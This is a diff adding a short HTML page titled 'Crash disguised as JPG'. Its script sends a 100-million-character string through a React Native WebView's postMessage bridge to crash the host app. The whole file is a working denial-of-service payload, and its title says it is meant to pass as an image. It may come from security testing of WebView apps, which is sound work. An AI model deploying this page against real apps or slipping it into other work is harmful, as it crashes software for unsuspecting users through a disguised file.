@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Crash disguised as JPG</title>
+</head>
+<body>
+<script>
+const payload = "A".repeat(100_000_000);
+if (window.ReactNativeWebView) {
+  window.ReactNativeWebView.postMessage(payload);
+} else {
+  document.write("<h3>ReactNativeWebView not detected</h3>");
+}
+</script>
+</body>
+</html>
